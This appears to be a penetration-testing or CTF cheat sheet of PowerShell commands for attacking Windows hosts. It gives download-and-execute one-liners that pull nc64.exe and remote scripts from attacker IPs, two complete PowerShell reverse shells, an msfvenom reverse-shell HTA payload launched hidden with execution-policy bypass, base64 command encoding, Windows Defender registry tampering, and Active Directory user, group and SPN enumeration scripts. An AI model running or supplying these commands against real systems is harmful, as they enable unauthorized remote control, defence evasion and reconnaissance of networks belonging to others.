## Download file from http:

```
Invoke-WebRequest -Uri "http://10.10.14.25/nc64.exe" -OutFile ".\"  #This sometimes works

Invoke-WebRequest -Uri "http://10.10.14.25/nc64.exe" -OutFile ".\nc64.exe" #Specify Name if above doesn't work

**Also for some reason powershell only likes "" for quotes not ''**
```

## Download and run powershell script:

```
iex(New-Object Net.WebClient).downloadstring('http://10.10.10.10/shell.ps1')

cmd /c powershell iex(new-object net.webclient).downloadstring('http://10.10.14.31/a.ps1')
```

## Recursive Copy

```
Copy-Item -Path $sourceRoot -Recurse -Destination $destinationRoot 
```

## Get Registry Values 

```
Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender'
```

## Remove Registry Values

```
Remove-Item -Force -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'
```

## Convert to encoded within linux for Powershell:

```
echo "iex(command)" | iconv --to-code UTF-16LE | base64 -w 0
```

## Convert file to base64:

```
$fc = Get-Content "File"
$fe = [System.Text.Encoding]::UTF8.GetBytes($fc)
[System.Convert]::ToBase64String($fe)

```

## Test Connection Down port

```
Test-NetConnection -ComputerName 10.10.10.100 -Port 389
```

## Pipe a Command into Powershell

```
echo IEX(New-Object Net.WebClient).DownloadString('http://') | powershell -noprofile -

```

## Check File Ownership

```
Get-ACL root.txt | fl *
```

**## Run powershell script on reverse shell**

```
powershell -nolog -executionpolicy bypass -file .\a.ps1
```

**## One liner powershell reverse shell:**

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.14',8085); $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ ;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (IEX $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; $client.Close()"
```

## Powershell revere shell clean

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
 $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $sendback = (iex $data 2>&1 | Out-String );
 $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
 $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
 $stream.Write($sendbyte,0,$sendbyte.Length);
 $stream.Flush();
}
$client.Close();

```

## ## Run as a new user through powershell

1. Create a var with the password, note you need to create it as a "Secure String" and not plaintext:  
## In powershell "Secure Strings" are used to hold passwords and such

```
$SecPass = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
```
2. Create your credentials:
```
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $SecPass)
```

3. Run a new powershell process with creds:  

```
Start-Process -FilePath "powershell" -argumentlist "whoami" -Credentail $cred -NoNewWindow
```

---
<br />


## Enmurate Installed Drivers:

```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', 'Path'
```

## Enmurate Installed Driver Versions

```
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

## Enmurate Running Versions

```
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

## Enmurate Domain Name

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```

## Enmurate Powershell Version:

```
$PSVersionTable
```

## Run Powershell as Admin (note: this prompts for UAC, however if you run a lolbin it might not)

```
powershell.exe Start-Process powershell -Verb runAs
```

## Copy to remote places with powershell

```powershell

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

```

## Awesome Script to Enmurate all users on the domain

```powershell
#Get Current Domain information
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

#Pull out domain controller name
$PDC = ($domainObj.PdcRoleOwner).Name

#Start building search string
$SearchString = "LDAP://"
$SearchString += $PDC + "/"

#Get Distinguished name, string modification
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

#Complete search string
$SearchString += $DistinguishedName

#Create your searcher
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

#Create your directory domain??
$objDomain = New-Object System.DirectoryServices.DirectoryEntry

#Build your search query
$Searcher.SearchRoot = $objDomain

#Apply Filters (more filters at: https://docs.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype?redirectedfrom=MSDN)
#Note: the samAccountType is in Decimal, MSDN displays it as hex
#This filter only finds users
$Searcher.filter="samAccountType=805306368"

#Now search AD via LDAP API
$Result = $Searcher.FindAll()

#Pull out all properties in found objects
Foreach($obj in $Result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop
 }

 Write-Host "------------------------"
}
```

## -------------------

</br>

## Same as above but used for group enmuration

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

#Individual Group
$Searcher.filter="(name=Secret_Group)"
#All Groups
$Searcher.filter="(objectClass=Group)"

$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 $obj.Properties.member
}
```

## IF YOU WANT TO SEARCH FOR Service Principal Names when looking for stuff us this filter:

```powershell
#Webserver
$Searcher.filter="serviceprincipalname=*http*"

```

## -------------------

</br>

## Powershell, execute playload in hidden mode

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta

powershell.exe -nop -nolog -executionpolicy bypass -w hidden -e aQBmACgAWwBJAG4AdABQ.....
```

## Find all the hidden files:

Get-ChildItem -ErrorAction SilentlyContinue -R -H | ForEach { if ($_ -is [System.IO.FileInfo]) { Write-Host $_.FullName}}